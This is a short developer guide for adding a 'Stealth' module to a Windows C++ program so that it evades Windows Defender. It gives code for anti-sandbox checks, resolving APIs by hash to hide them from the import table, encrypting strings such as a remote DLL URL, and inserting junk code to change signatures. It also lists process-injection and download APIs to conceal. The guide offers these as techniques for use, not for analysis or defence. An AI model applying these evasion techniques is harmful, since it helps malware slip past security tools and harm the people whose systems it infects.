# Integration Guide: Stealth Module

This guide explains how to integrate the `Stealth` module into your project to reduce Windows Defender detection.

## 1. Setup
Add `Stealth.h` and `Stealth.cpp` to your Visual Studio project.

## 2. Initialization
Call `Stealth::Initialize()` as the **very first thing** in your `main()` or `WinMain()`. This will perform anti-sandbox checks before any "loud" code runs.

```cpp
#include "Stealth.h"

int main() {
    Stealth::Initialize(); // <--- Add this
    // ... rest of your code
}
```

## 3. Dynamic API Resolution (Hiding from IAT)
Instead of calling Windows APIs directly, use the dynamic resolver. This prevents the functions from appearing in your executable's "Import Address Table" (IAT).

### Example: CreateProcessW
**Before:**
```cpp
CreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
```

**After:**
```cpp
#include "Stealth.h"

auto pCreateProcessW = (decltype(&CreateProcessW))Stealth::GetApiByHash(GetModuleHandleW(L"kernel32.dll"), Hashes::CreateProcessW);
if (pCreateProcessW) {
    pCreateProcessW(nullptr, cmd.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
}
```

## 4. String Obfuscation
Always use your `Obfuscator` for sensitive strings like URLs, file paths, and DLL names. Use the `DECRYPT_W` macro for cleaner code.

**Before:**
```cpp
const std::wstring url = L"https://my-secret-git.com/plugin.dll";
```

**After:**
```cpp
// Encrypted bytes for "https://my-secret-git.com/plugin.dll"
std::vector<unsigned char> encUrl = { ... };
const std::wstring url = DECRYPT_W(encUrl, 0xAF);
```

## 5. Signature Breaking (Junk Code)
Sprinkle the `JUNK_CODE_SMALL` macro inside your loops or complex functions to change the binary signature each time you compile.

```cpp
for (auto& plugin : plugins) {
    JUNK_CODE_SMALL; // <--- Add this to confuse heuristics
    plugin->Stop();
}
```

## 6. Target APIs to Hide
For maximum stealth, use the dynamic resolver for these "Red Flag" APIs:
- `InternetOpenW`, `InternetOpenUrlW`, `InternetReadFile` (Network activity)
- `CreateProcessW`, `TerminateProcess` (Process manipulation)
- `WriteProcessMemory`, `CreateRemoteThread` (Injection)
- `CreateNamedPipeW`, `ConnectNamedPipe` (IPC)
